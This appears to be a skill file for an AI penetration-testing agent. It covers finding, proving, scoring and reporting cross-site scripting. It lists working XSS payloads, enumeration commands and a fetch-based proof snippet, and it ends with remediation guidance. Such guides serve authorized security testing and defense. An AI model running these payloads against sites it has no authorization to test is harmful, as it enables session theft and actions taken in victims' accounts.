---
name: xss
description: 'Cross-site scripting testing for reflected, stored, and DOM-based vectors with execution proof rather than payload-string matching. Triggers: XSS, cross-site scripting, "script ထည့်", "alert ထွက်", "js စမ်း".'
category: vulnerabilities
track: 02-vuln-class
tags: [xss, dom, csp, browser, client-side]
severity_ceiling: high
requires: [baseline-http-capture]
tools: [curl, agent-browser, ffuf, arjun]
cwe: CWE-79
owasp: [A05:2025]
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.

# Cross-Site Scripting

## 1. Preconditions

- The reflection or persistence point is known (parameter, JSON field, header, filename).
- You know the **output context**: HTML text, attribute, quoted attribute, `<script>`
  string, JS template, CSS, URL, or `innerHTML` sink.
- A browser you control for execution proof (`agent-browser`), plus an intercepting proxy
  or `curl` for the raw exchange.
- A canary endpoint for OOB proof (`interactsh-client`) when blind.

`<script>alert(1)</script>` returned in the body is **not** proof. It is a reflection.
Proof is code running in a document context.

## 2. Gate

Two cells:

```bash
U='https://app.example.com/search?q='
curl -s "$U"hello -o base.html
curl -s "$U"hello%22%3E%3Cx%3E -o test.html
diff <(grep -o 'q=[^&"]*' base.html) <(grep -o 'q=[^&"]*' test.html)
grep -c '<x>' test.html    # 1 means unencoded
```

**Pass:** the injected `<x>` appears unencoded in a context where a script can execute.
**Fail:** `&lt;x&gt;`, `\u003cx\u003e`, or stripped. Encoded output in an HTML-text context
is safe; encoded output that is later decoded by client JS is not — check the client code.

## 3. Enumeration

```bash
# reflection sweep across parameters
ffuf -u 'https://app.example.com/search?q=FUZZ' -w /tmp/xss.txt -mr 'FUZZ' -fs 0
# hidden params
arjun -u 'https://app.example.com/search' -m GET
# DOM sinks in bundles
grep -oE '(innerHTML|outerHTML|document\.write|eval|setTimeout|insertAdjacentHTML|srcdoc|location\.hash|location\.search)' app.js | sort | uniq -c
# postMessage listeners
grep -oE 'addEventListener\(.message.' app.js
```

Sinks worth testing: search, profile name, support ticket, filename in upload list,
`returnUrl`/`next` in a `href`, markdown/Rich-text comments, PDF/HTML export, email
templates, error pages echoing the path.

## 4. Test Matrix

| # | Context | Probe | Executes? | Notes |
|---|---|---|---|---|
| 1 | HTML text | `<x>` | no | encoding check only |
| 2 | HTML text | `<img src=x onerror=alert(1)>` | ? | |
| 3 | Double-quoted attr | `" onmouseover="alert(1)` | ? | |
| 4 | Single-quoted attr | `' onmouseover='alert(1)` | ? | |
| 5 | Unquoted attr | `x onmouseover=alert(1)` | ? | |
| 6 | `<script>` string | `</script><img src=x onerror=alert(1)>` | ? | |
| 7 | JS string | `'-alert(1)-'` or `\';alert(1)//` | ? | |
| 8 | href | `javascript:alert(1)` | ? | strip whitespace/entities on test |
| 9 | DOM `innerHTML` from hash | `#<img src=x onerror=alert(1)>` | ? | no server involvement |
| 10 | Markdown | `[x](javascript:alert(1))` | ? | |

## 5. Proof

1. **Execution, not reflection.** Use a real browser and capture the observable effect:

```bash
agent-browser open 'https://app.example.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E'
agent-browser dialog status
agent-browser snapshot -i          # visible confirmation of the payload rendering
agent-browser screenshot /tmp/xss_proof.png
```

2. **Non-alert PoC** for a report, so defenders can reproduce safely:

```html
<img src=x onerror="fetch('/xss-log?c='+document.domain)">
```

3. **Stored XSS** — two independent identities: user A stores, user B (or an admin view)
   renders. Capture both sessions and the stored value in the DB/API response.

4. **DOM XSS** — no server echo. Show the sink and the source:

```js
// source: location.hash  ->  sink: el.innerHTML
const q = decodeURIComponent(location.hash.slice(1));
document.getElementById('out').innerHTML = q;   // sink
```

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| The string is escaped but my grep matched the raw request in a JS variable | Inspect the exact DOM node via `agent-browser get text`/`eval` |
| CSP blocked it | Read `Content-Security-Policy`; if blocked, the finding is "XSS-sink present, CSP mitigated" — separate severity |
| `alert` was auto-dismissed by the automation | Use a DOM mutation proof (`document.title=...`) plus screenshot |
| It only runs in my own session (self-XSS) | Require a second identity or a victim-context render |
| The parameter is not reflected in the rendered page for other users | Test the authenticated victim flow end-to-end |
| It "executes" in a sandboxed iframe with `allow-scripts` off | Check the iframe `sandbox` attribute |

## 7. Impact

Demonstrated session/token theft, action-on-behalf-of-victim, or data read in the victim's
context. *"Stored XSS in the ticket subject executes for every support agent who opens the
queue; a payload that reads the CSRF token and creates an admin user was verified with a
second agent account."*

If you only proved `alert()`, say so and rate it Medium at most, with
`UI:R` and the victim population stated.

## 8. CVSS 3.1

```text
Stored XSS in admin-viewed field, session theft demonstrated (self-propagation):
  CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N = 8.7 (High)
Reflected XSS requiring crafted link click:
  CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 (Medium)
Self-XSS only: PR:H, UI:R -> ~2.0 (Low/Info)
```

`S:C` because script runs in the victim's origin, crossing the user/application boundary.

## 9. Report

```markdown
# Stored XSS in support ticket subject executes in the agent queue

**Severity:** High (CVSS 3.1: 8.7 — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)
**Affected asset:** app.example.com  POST /api/tickets → GET /agent/queue
**Category:** CWE-79 · OWASP A05:2025
```

Include: the storing request, the rendering request, the browser proof, and the
second-identity confirmation.

## 10. Remediation

- **Context-aware output encoding** at render time, not input filtering at write time.
- Set the correct sink API: `textContent` instead of `innerHTML`; `setAttribute` for
  attributes; `URL` constructor with an allowlist for links.
- Strict CSP as defence in depth:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<random>'; object-src 'none'; base-uri 'none'
```

- `HttpOnly` + `SameSite=Lax` cookies so token theft requires more than `document.cookie`.
- Sanitise rich text server-side with a maintained allowlist library (DOMPurify server-side
  equivalent), then re-encode on output.

Regression test: post `<img src=x onerror=1>` and assert the rendered HTML contains the
encoded form and no `onerror` attribute.

## 11. References

- OWASP XSS Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PortSwigger — Cross-site scripting
